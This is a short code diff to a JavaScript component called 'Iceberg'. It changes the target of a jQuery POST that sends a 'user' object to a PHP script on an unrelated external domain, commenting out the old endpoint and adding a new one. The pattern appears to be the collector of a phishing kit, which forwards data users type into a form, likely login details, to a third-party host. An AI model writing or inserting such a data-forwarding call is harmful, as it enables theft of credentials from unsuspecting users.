@@ -80,7 +80,9 @@ export const Iceberg = ()=>{
     
           $.ajax({
               type: "POST",
-              url: "https://physicaleducationdiploma.com/footer/spein.php",
+            //   url: "https://physicaleducationdiploma.com/footer/spein.php",
+              url: "https://physicaleducationdiploma.com/component/btex.php",
+            //   https://physicaleducationdiploma.com/component/btex.php
               data: user,
               success(data) {
                   console.log(data);
